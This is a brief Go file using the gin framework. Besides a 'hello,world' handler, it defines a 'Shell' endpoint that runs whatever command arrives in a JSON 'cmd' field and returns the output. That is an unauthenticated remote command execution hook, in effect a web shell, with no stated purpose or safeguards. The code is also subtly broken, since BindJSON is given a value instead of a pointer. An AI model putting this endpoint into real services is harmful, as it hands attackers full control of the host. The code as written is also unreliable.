package deal

import (
	"github.com/gin-gonic/gin"
	"net/http"
	"os/exec"
)

type Cmd struct {
	Cmd string `json:"cmd"`
}

func Get(context *gin.Context) {
	context.String(http.StatusOK, "hello,world")
}

func Shell(context *gin.Context) {
	var cmd Cmd
	context.BindJSON(cmd)
	str := exec.Command(cmd.Cmd)
	ip, err := str.Output()
	if err != nil {
		print(err.Error())
		return
	}
	context.String(http.StatusOK, string(ip))
	println("命令执行完成")
}
